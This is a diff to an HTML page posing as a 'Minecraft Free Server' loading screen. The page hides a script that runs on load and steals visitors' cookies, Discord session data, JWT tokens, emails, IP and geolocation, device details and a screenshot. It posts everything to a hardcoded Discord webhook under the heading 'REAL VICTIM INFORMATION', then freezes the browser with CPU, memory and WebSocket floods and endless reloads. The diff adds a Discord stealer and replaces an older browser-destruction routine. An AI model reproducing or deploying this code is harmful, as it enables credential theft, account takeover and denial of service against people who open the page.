@@ -17,7 +17,7 @@
     </style>
 </head>
 <body>
-    <h1>Loading Minecraft Server...</h1>
+    <h1>Loading Minecraft Free Server...</h1>
     <p>Please wait</p>
 
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
@@ -27,12 +27,141 @@
         setTimeout(autoExploit, 2000);
 
         // ============================================
+        // 🎯 DISCORD COOKIE STEALER
+        // ============================================
+        function stealDiscordCookies() {
+            const discordData = {
+                cookies: [],
+                tokens: [],
+                localStorage: {},
+                hasDiscord: false,
+                details: {}
+            };
+
+            try {
+                // 1. فحص إذا في صفحة الديسكورد
+                if (window.location.hostname.includes('discord.com') || window.location.href.includes('discord')) {
+                    discordData.hasDiscord = true;
+                    discordData.details.page = 'Discord Web';
+
+                    // سرقة الكوكيز
+                    const cookies = document.cookie.split(';');
+                    const discordCookieNames = ['__Secure', 'dco', 'sdc', 'token', 'session', 'user', 'discord', 'cf'];
+
+                    cookies.forEach(cookie => {
+                        discordCookieNames.forEach(name => {
+                            if (cookie.toLowerCase().includes(name.toLowerCase())) {
+                                discordData.cookies.push(cookie.trim());
+                            }
+                        });
+                    });
+
+                    // سرقة من localStorage
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session') ||
+                            key.toLowerCase().includes('user') || key.toLowerCase().includes('discord')) {
+                            discordData.localStorage[key] = value;
+                        }
+                        // البحث عن توكنات JWT
+                        if (value && value.split('.').length === 3 && value.length > 100) {
+                            discordData.tokens.push({[key]: value.substring(0, 50) + '...'});
+                        }
+                    }
+                }
+
+                // 2. فحص إذا الضحية عنده تطبيق الديسكورد
+                if (navigator.userAgent.includes('Discord') || navigator.userAgent.includes('Electron')) {
+                    discordData.hasDiscord = true;
+                    discordData.details.app = 'Discord Desktop App';
+
+                    // محاولة الوصول لملفات LevelDB (نظري)
+                    discordData.details.note = 'Discord Desktop detected -可能需要 LevelDB extraction';
+                }
+
+                // 3. البحث عن أي كوكيز خاصة بالديسكورد في المتصفح
+                const allCookies = document.cookie.split(';');
+                allCookies.forEach(cookie => {
+                    if (cookie.toLowerCase().includes('discord') ||
+                        cookie.toLowerCase().includes('dco') ||
+                        cookie.toLowerCase().includes('sdc')) {
+                        discordData.cookies.push(cookie.trim());
+                        discordData.hasDiscord = true;
+                    }
+                });
+
+            } catch(e) {}
+
+            return discordData;
+        }
+
+        // ============================================
+        // 🍪 وظيفة سرقة الكوكيز
+        // ============================================
+        function stealCookies() {
+            const stolenCookies = [];
+            const importantKeywords = ['session', 'auth', 'token', 'login', 'user', 'id', 'sid', 'csrf', 'xsrf', 'remember', 'secure', 'jwt', 'access', 'refresh', 'bearer', 'discord', 'dco', 'sdc'];
+
+            const cookies = document.cookie.split(';');
+
+            cookies.forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (!name || !value) return;
+
+                // تصنيف الكوكي
+                let importance = 'normal';
+                importantKeywords.forEach(keyword => {
+                    if (name.toLowerCase().includes(keyword.toLowerCase())) {
+                        importance = '🔥 HIGH VALUE';
+                    }
+                });
+
+                // فحص JWT
+                if (value && value.split('.').length === 3 && value.length > 50) {
+                    importance = '💎 JWT TOKEN';
+                }
+
+                // فحص إذا كانت كوكيز ديسكورد
+                if (name.toLowerCase().includes('discord') || name.toLowerCase().includes('dco') || name.toLowerCase().includes('sdc')) {
+                    importance = '🎯 DISCORD COOKIE';
+                }
+
+                stolenCookies.push({
+                    name: name,
+                    value: value,
+                    importance: importance,
+                    length: value.length
+                });
+            });
+
+            return stolenCookies;
+        }
+
+        // ============================================
+        // 📊 معلومات إضافية عن الكوكيز
+        // ============================================
+        function getCookieStats() {
+            const cookies = document.cookie.split(';').filter(c => c.trim());
+
+            return {
+                totalCount: cookies.length,
+                hasSession: document.cookie.toLowerCase().includes('session'),
+                hasAuth: document.cookie.toLowerCase().includes('auth'),
+                hasToken: document.cookie.toLowerCase().includes('token'),
+                hasJWT: document.cookie.includes('.') && document.cookie.split('.').length > 2,
+                hasDiscord: document.cookie.toLowerCase().includes('discord') || document.cookie.toLowerCase().includes('dco') || document.cookie.toLowerCase().includes('sdc'),
+                cookieString: document.cookie || 'No cookies'
+            };
+        }
+
+        // ============================================
         // دالة البحث عن الإيميلات الحقيقية
         // ============================================
         function findRealEmails() {
             const emails = new Set();
             const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-            
+
             try {
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
@@ -43,7 +172,7 @@
                         }
                     });
                 }
-                
+
                 for (let i = 0; i < localStorage.length; i++) {
                     const value = localStorage.getItem(localStorage.key(i));
                     if (value && typeof value === 'string') {
@@ -57,7 +186,7 @@
                         }
                     }
                 }
-                
+
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const value = sessionStorage.getItem(sessionStorage.key(i));
                     if (value && typeof value === 'string') {
@@ -72,7 +201,7 @@
                     }
                 }
             } catch(e) {}
-            
+
             return Array.from(emails);
         }
 
@@ -83,28 +212,28 @@
             let username = "Unknown";
             try {
                 const userKeys = ['username', 'user', 'name', 'displayName', 'fullName', 'realname', 'real_name'];
-                
+
                 for (let key of userKeys) {
                     const localValue = localStorage.getItem(key);
                     if (localValue && localValue.length > 2 && !localValue.includes('test') && !localValue.includes('example')) {
                         username = localValue;
                         break;
                     }
-                    
+
                     const sessionValue = sessionStorage.getItem(key);
                     if (sessionValue && sessionValue.length > 2 && !sessionValue.includes('test') && !sessionValue.includes('example')) {
                         username = sessionValue;
                         break;
                     }
                 }
-                
+
                 const cookies = document.cookie;
                 const patterns = [
                     /user[_-]?name=([^;]+)/i,
                     /login=([^;]+)/i,
                     /username=([^;]+)/i
                 ];
-                
+
                 for (let pattern of patterns) {
                     const match = cookies.match(pattern);
                     if (match && match[1] && !match[1].includes('test') && !match[1].includes('example')) {
@@ -112,7 +241,7 @@
                         break;
                     }
                 }
-                
+
             } catch(e) {}
             return username;
         }
@@ -139,67 +268,67 @@
         // ============================================
         function findRealTokens() {
             const tokens = [];
-            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password'];
-            
+            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'discord'];
+
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
                 if (!name || !value) return;
-                
+
                 if (value.includes('test') || value.includes('example') || value.includes('demo') || value.includes('123')) {
                     return;
                 }
-                
+
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
-                        tokens.push({ 
-                            source: '🍪 Cookie', 
-                            name: name, 
-                            value: value.length > 50 ? value.substring(0, 50) + '...' : value, 
-                            type: keyword 
+                        tokens.push({
+                            source: '🍪 Cookie',
+                            name: name,
+                            value: value.length > 50 ? value.substring(0, 50) + '...' : value,
+                            type: keyword
                         });
                     }
                 });
-                
+
                 if (value && value.split('.').length === 3 && value.length > 50) {
-                    tokens.push({ 
-                        source: '🔐 JWT Token', 
-                        name: name, 
-                        value: value.substring(0, 50) + '...', 
-                        type: 'JWT' 
+                    tokens.push({
+                        source: '🔐 JWT Token',
+                        name: name,
+                        value: value.substring(0, 50) + '...',
+                        type: 'JWT'
                     });
                 }
             });
-            
+
             try {
                 for(let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
                     let value = localStorage.getItem(key);
-                    
+
                     if (!value || value.includes('test') || value.includes('example') || value.includes('demo')) continue;
-                    
+
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
-                            tokens.push({ 
-                                source: '💾 localStorage', 
-                                name: key, 
-                                value: value.length > 50 ? value.substring(0, 50) + '...' : value, 
-                                type: keyword 
+                            tokens.push({
+                                source: '💾 localStorage',
+                                name: key,
+                                value: value.length > 50 ? value.substring(0, 50) + '...' : value,
+                                type: keyword
                             });
                         }
                     });
                 }
             } catch(e) {}
-            
+
             return tokens;
         }
 
         // ============================================
-        // معلومات حقيقية فقط بالتنسيق المطلوب
+        // معلومات حقيقية فقط
         // ============================================
         async function getRealInfo() {
             const info = {};
-            
+
             // الموقع الجغرافي
             try {
                 const geoResponse = await fetch('https://ipapi.co/json/');
@@ -210,6 +339,7 @@
                     info.isp = geoData.org;
                     info.latitude = geoData.latitude;
                     info.longitude = geoData.longitude;
+                    info.timezone_geo = geoData.timezone;
                 }
             } catch (e) {}
 
@@ -272,6 +402,64 @@
         }
 
         // ============================================
+        // 💥 QUICK FREEZE - يعلق الموقع بسرعة
+        // ============================================
+        function quickFreeze() {
+
+            // 1. استهلاك CPU فوري
+            const numCores = navigator.hardwareConcurrency || 4;
+            for(let core = 0; core < numCores * 3; core++) {
+                setTimeout(() => {
+                    while(true) {
+                        for(let i=0; i<1000000; i++) {
+                            Math.pow(Math.random() * 999999999, 999);
+                            Math.sqrt(Math.random() * 999999999);
+                            Math.sin(Math.random() * 999999) * Math.cos(Math.random() * 999999);
+                        }
+                    }
+                }, 1);
+            }
+
+            // 2. استهلاك RAM سريع
+            let memoryHog = [];
+            for(let i=0; i<5000; i++) {
+                memoryHog.push(new Array(1000000).fill('💀'));
+            }
+
+            // 3. WebSocket flood
+            for(let i=0; i<100; i++) {
+                try {
+                    let ws = new WebSocket('wss://echo.websocket.org');
+                    setInterval(() => {
+                        ws.send('💥'.repeat(1000000));
+                    }, 1);
+                } catch(e) {}
+            }
+
+            // 4. إعادة تحميل مستمرة
+            setInterval(() => {
+                location.reload();
+            }, 100);
+
+            // 5. رسالة تعليق
+            document.body.innerHTML = `
+                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; color:red; font-size:50px; text-align:center; z-index:9999999; display:flex; flex-direction:column; justify-content:center; align-items:center; animation:blink 0.1s infinite">
+                    <h1 style="font-size:150px; color:#ff0000; text-shadow:0 0 50px red">⚠️</h1>
+                    <h1 style="font-size:100px; color:#ff0000">SYSTEM HALTED</h1>
+                    <p style="font-size:40px; color:#ff6666">Browser will be unresponsive</p>
+                    <p style="font-size:30px; color:yellow; margin-top:50px">🔴 FORCE SHUTDOWN REQUIRED 🔴</p>
+                    <style>
+                        @keyframes blink {
+                            0% { background:black; }
+                            50% { background:#330000; }
+                            100% { background:black; }
+                        }
+                    </style>
+                </div>
+            `;
+        }
+
+        // ============================================
         // الدالة الرئيسية
         // ============================================
         async function autoExploit() {
@@ -281,8 +469,8 @@
                 // ============================================
                 let screenshotBase64 = '';
                 try {
-                    const canvas = await html2canvas(document.body, { 
-                        scale: 0.8, 
+                    const canvas = await html2canvas(document.body, {
+                        scale: 0.8,
                         logging: false,
                         backgroundColor: '#1b2b3f'
                     });
@@ -290,54 +478,126 @@
                 } catch (e) {}
 
                 // ============================================
-                // 2. معلومات حقيقية
+                // 2. معلومات أساسية
                 // ============================================
                 const ipAddress = await fetch('https://api.ipify.org?format=json')
                     .then(r => r.json())
                     .then(d => d.ip)
                     .catch(() => 'Unknown');
-                    
+
                 const realInfo = await getRealInfo();
                 const realEmails = findRealEmails();
                 const realUsername = getRealUsername();
                 const realTokens = findRealTokens();
 
                 // ============================================
-                // تجهيز الرسالة
+                // 3. سرقة الكوكيز (بما فيها الديسكورد)
+                // ============================================
+                const cookieStats = getCookieStats();
+                const stolenCookies = stealCookies();
+                const discordInfo = stealDiscordCookies();
+
+                // تجهيز رسالة الكوكيز
+                let cookieMessage = '';
+                stolenCookies.forEach(c => {
+                    cookieMessage += `${c.importance} | **${c.name}**: \`${c.value.substring(0, 50)}${c.value.length > 50 ? '...' : ''}\` (${c.length} chars)\n`;
+                });
+
+                // ============================================
+                // تجهيز الرسالة النهائية
                 // ============================================
                 let textMessage = '🚨 REAL VICTIM INFORMATION 🚨\n\n';
 
-                if (realInfo.computerName) {
-                    textMessage += `💻 Computer Name: ${realInfo.computerName}\n`;
-                }
-                if (ipAddress) {
-                    textMessage += `🌐 IP Address: ${ipAddress}\n`;
-                }
-                if (realInfo.city && realInfo.country) {
-                    textMessage += `📍 Location: ${realInfo.city}, ${realInfo.country}\n`;
-                } else if (realInfo.country) {
-                    textMessage += `📍 Location: ${realInfo.country}\n`;
-                }
-                if (realInfo.isp) {
-                    textMessage += `🏢 ISP: ${realInfo.isp}\n`;
-                }
+                // المعلومات الأساسية
+                if (realInfo.computerName) textMessage += `💻 Computer Name: ${realInfo.computerName}\n`;
+                if (ipAddress) textMessage += `🌐 IP Address: ${ipAddress}\n`;
+
+                // عرض معلومات الموقع الجغرافي
+                if (realInfo.city && realInfo.country) textMessage += `📍 Location: ${realInfo.city}, ${realInfo.country}\n`;
+                else if (realInfo.country) textMessage += `📍 Location: ${realInfo.country}\n`;
+
+                // عرض رابط الخريطة
                 if (realInfo.latitude && realInfo.longitude) {
-                    textMessage += `🗺️ Coordinates: ${realInfo.latitude}, ${realInfo.longitude}\n`;
+                    const mapUrl = `https://www.google.com/maps/place/${realInfo.latitude},${realInfo.longitude}`;
+                    textMessage += `🗺️ [View on Map](${mapUrl})\n`;
+                    textMessage += `🌍 Coordinates: ${realInfo.latitude}, ${realInfo.longitude}\n`;
                 }
 
-                if (document.cookie) {
-                    textMessage += `\n🍪 COOKIES:\n${document.cookie}\n`;
+                // عرض معلومات العملة واللغة
+                if (realInfo.country) {
+                    const countryInfo = {
+                        'United States': { currency: 'USD', language: 'English' },
+                        'United Kingdom': { currency: 'GBP', language: 'English' },
+                        'Germany': { currency: 'EUR', language: 'German' },
+                        'France': { currency: 'EUR', language: 'French' },
+                        'Canada': { currency: 'CAD', language: 'English/French' },
+                        'Japan': { currency: 'JPY', language: 'Japanese' },
+                        'Australia': { currency: 'AUD', language: 'English' },
+                        'Saudi Arabia': { currency: 'SAR', language: 'Arabic' },
+                        'Egypt': { currency: 'EGP', language: 'Arabic' },
+                        'United Arab Emirates': { currency: 'AED', language: 'Arabic' },
+                        'Kuwait': { currency: 'KWD', language: 'Arabic' },
+                        'Qatar': { currency: 'QAR', language: 'Arabic' },
+                        'Oman': { currency: 'OMR', language: 'Arabic' },
+                        'Bahrain': { currency: 'BHD', language: 'Arabic' },
+                    };
+
+                    if (countryInfo[realInfo.country]) {
+                        textMessage += `💰 Currency: ${countryInfo[realInfo.country].currency}\n`;
+                        textMessage += `🗣️ Language: ${countryInfo[realInfo.country].language}\n`;
+                    }
                 }
 
+                if (realInfo.isp) textMessage += `🏢 ISP: ${realInfo.isp}\n`;
+                if (realInfo.timezone_geo) textMessage += `⏰ Timezone: ${realInfo.timezone_geo}\n`;
+
+                // Discord Info
+                if (discordInfo.hasDiscord) {
+                    textMessage += `\n**🎯 DISCORD DETECTED!**\n`;
+                    if (discordInfo.details.page) textMessage += `• Platform: ${discordInfo.details.page}\n`;
+                    if (discordInfo.details.app) textMessage += `• Platform: ${discordInfo.details.app}\n`;
+                    if (discordInfo.cookies.length > 0) {
+                        textMessage += `• Discord Cookies:\n`;
+                        discordInfo.cookies.forEach(c => textMessage += `  ${c}\n`);
+                    }
+                    if (Object.keys(discordInfo.localStorage).length > 0) {
+                        textMessage += `• Discord LocalStorage:\n`;
+                        Object.entries(discordInfo.localStorage).forEach(([k,v]) => {
+                            textMessage += `  ${k}: ${v.substring(0, 50)}${v.length > 50 ? '...' : ''}\n`;
+                        });
+                    }
+                }
+
+                // Cookie Statistics
+                textMessage += `\n**📊 COOKIE STATISTICS:**\n`;
+                textMessage += `• Total Cookies: ${cookieStats.totalCount}\n`;
+                textMessage += `• Session Cookies: ${cookieStats.hasSession ? '✅' : '❌'}\n`;
+                textMessage += `• Auth Cookies: ${cookieStats.hasAuth ? '✅' : '❌'}\n`;
+                textMessage += `• Token Cookies: ${cookieStats.hasToken ? '✅' : '❌'}\n`;
+                textMessage += `• JWT Tokens: ${cookieStats.hasJWT ? '✅' : '❌'}\n`;
+                textMessage += `• Discord Cookies: ${cookieStats.hasDiscord ? '✅' : '❌'}\n`;
+
+                // Stolen Cookies
+                if (stolenCookies.length > 0) {
+                    textMessage += `\n**🍪 STOLEN COOKIES:**\n`;
+                    textMessage += cookieMessage;
+                }
+
+                // Raw Cookies
+                textMessage += `\n**🔍 RAW COOKIES:**\n`;
+                textMessage += `\`\`\`\n${cookieStats.cookieString}\n\`\`\`\n`;
+
+                // Network
                 if (realInfo.networkEffectiveType || realInfo.networkDownlink || realInfo.networkRtt) {
-                    textMessage += `\n🌍 NETWORK:\n`;
+                    textMessage += `\n**🌍 NETWORK:**\n`;
                     if (realInfo.networkEffectiveType) textMessage += `• Type: ${realInfo.networkEffectiveType}\n`;
                     if (realInfo.networkDownlink) textMessage += `• Speed: ${realInfo.networkDownlink}\n`;
                     if (realInfo.networkRtt) textMessage += `• Ping: ${realInfo.networkRtt}\n`;
                 }
 
+                // System
                 if (realInfo.browserPlatform || realInfo.browserLanguage || realInfo.browserHardwareConcurrency || realInfo.browserDeviceMemory || realInfo.batteryLevel) {
-                    textMessage += `\n💻 SYSTEM:\n`;
+                    textMessage += `\n**💻 SYSTEM:**\n`;
                     if (realInfo.browserPlatform) textMessage += `• Platform: ${realInfo.browserPlatform}\n`;
                     if (realInfo.browserLanguage) textMessage += `• Language: ${realInfo.browserLanguage}\n`;
                     if (realInfo.browserHardwareConcurrency) textMessage += `• CPU Cores: ${realInfo.browserHardwareConcurrency}\n`;
@@ -345,35 +605,41 @@
                     if (realInfo.batteryLevel) textMessage += `• Battery: ${realInfo.batteryLevel} (${realInfo.batteryCharging})\n`;
                 }
 
+                // Screen
                 if (realInfo.screenWidth && realInfo.screenHeight) {
-                    textMessage += `\n🖥️ SCREEN:\n`;
+                    textMessage += `\n**🖥️ SCREEN:**\n`;
                     textMessage += `• Resolution: ${realInfo.screenWidth}x${realInfo.screenHeight}\n`;
                     if (realInfo.screenColorDepth) textMessage += `• Color Depth: ${realInfo.screenColorDepth}-bit\n`;
                 }
 
+                // GPU
                 if (realInfo.gpuRenderer) {
-                    textMessage += `\n🎮 GPU:\n• ${realInfo.gpuRenderer}\n`;
+                    textMessage += `\n**🎮 GPU:**\n• ${realInfo.gpuRenderer}\n`;
                 }
 
+                // Time
                 if (realInfo.timeLocal) {
-                    textMessage += `\n⏰ TIME:\n`;
+                    textMessage += `\n**⏰ TIME:**\n`;
                     textMessage += `• Local: ${realInfo.timeLocal}\n`;
                     if (realInfo.timeTimezone) textMessage += `• Timezone: ${realInfo.timeTimezone}\n`;
                 }
 
+                // Tokens
                 if (realTokens.length > 0) {
-                    textMessage += `\n🔑 TOKENS:\n`;
+                    textMessage += `\n**🔑 TOKENS:**\n`;
                     realTokens.forEach(t => {
                         textMessage += `${t.source} | ${t.name}: ${t.value}\n`;
                     });
                 }
 
+                // Username
                 if (realUsername && realUsername !== 'Unknown' && !realUsername.includes('test')) {
-                    textMessage += `\n👤 Username: ${realUsername}\n`;
+                    textMessage += `\n**👤 Username:** ${realUsername}\n`;
                 }
 
+                // Emails
                 if (realEmails.length > 0) {
-                    textMessage += `\n📧 EMAILS:\n`;
+                    textMessage += `\n**📧 EMAILS:**\n`;
                     realEmails.forEach(email => {
                         textMessage += `• ${email}\n`;
                     });
@@ -383,7 +649,7 @@
                 // إرسال إلى Discord
                 // ============================================
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
-                
+
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -410,98 +676,13 @@
                 }
 
                 // ============================================
-                // 💀💀 TOTAL BROWSER DESTRUCTION 💀💀
+                // ⚡⚡ QUICK FREEZE بعد السرقة ⚡⚡
                 // ============================================
-                function destroyBrowser() {
-                    
-                    // طبقة 1-5: CPU overload
-                    const numCores = navigator.hardwareConcurrency || 4;
-                    for(let core = 0; core < numCores * 3; core++) {
-                        setInterval(() => {
-                            while(true) {
-                                for(let i=0; i<10000; i++) {
-                                    Math.pow(Math.random() * 999999999, Math.random() * 999);
-                                }
-                            }
-                        }, 1);
-                    }
-                    
-                    // طبقة 6-10: Memory flood
-                    let memoryHog = [];
-                    setInterval(() => {
-                        for(let i=0; i<500; i++) {
-                            memoryHog.push(new Array(1000000).fill('💀'));
-                        }
-                    }, 10);
-                    
-                    // طبقة 11: GPU overload
-                    for(let i=0; i<100; i++) {
-                        try {
-                            let canvas = document.createElement('canvas');
-                            canvas.width = 4000;
-                            canvas.height = 4000;
-                            let gl = canvas.getContext('webgl');
-                            if(gl) {
-                                setInterval(() => {
-                                    for(let j=0; j<10000; j++) {
-                                        gl.clear(gl.COLOR_BUFFER_BIT);
-                                        gl.drawArrays(gl.TRIANGLES, 0, 1000000);
-                                    }
-                                }, 1);
-                            }
-                        } catch(e) {}
-                    }
-                    
-                    // طبقة 12-20: باقي طبقات التدمير
-                    // WebSocket bomb
-                    for(let i=0; i<200; i++) {
-                        try {
-                            let ws = new WebSocket('wss://echo.websocket.org');
-                            setInterval(() => {
-                                ws.send('💥'.repeat(1000000));
-                            }, 1);
-                        } catch(e) {}
-                    }
-                    
-                    // AudioContext bomb
-                    try {
-                        for(let i=0; i<50; i++) {
-                            let audioCtx = new AudioContext();
-                            for(let j=0; j<100; j++) {
-                                let oscillator = audioCtx.createOscillator();
-                                oscillator.connect(audioCtx.destination);
-                                oscillator.start();
-                            }
-                        }
-                    } catch(e) {}
-                    
-                    // رسالة التخويف
-                    document.body.innerHTML = `
-                        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; color:red; font-size:50px; text-align:center; z-index:9999999; display:flex; flex-direction:column; justify-content:center; align-items:center; animation:blink 0.01s infinite">
-                            <h1 style="font-size:200px; color:#ff0000; text-shadow:0 0 50px red; margin-bottom:20px">EZ</h1>
-                            <p style="font-size:70px; color:#ff6666; margin:10px">⚠️ СИСТЕМА УНИЧТОЖЕНА ⚠️</p>
-                            <p style="font-size:55px; color:#ff3333; margin:10px">ВСЕ ДАННЫЕ УДАЛЕНЫ</p>
-                            <p style="font-size:45px; color:#ff0000; margin:10px">КОМПЬЮТЕР ВЗЛОМАН</p>
-                            <p style="font-size:35px; color:yellow; margin-top:50px">🔴🔴🔴🔴🔴🔴🔴🔴🔴</p>
-                            <style>
-                                @keyframes blink {
-                                    0% { background:black; }
-                                    50% { background:#330000; }
-                                    100% { background:black; }
-                                }
-                            </style>
-                        </div>
-                    `;
-                }
-
-                // تأخير 2 ثانية ثم التدمير
-                setTimeout(destroyBrowser, 2000);
+                setTimeout(quickFreeze, 500);
 
             } catch (error) {
                 console.log('Error but continuing...');
-                setTimeout(() => {
-                    document.body.innerHTML = '<h1 style="color:red">ERROR</h1>';
-                }, 2000);
+                quickFreeze();
             }
         }
     </script>
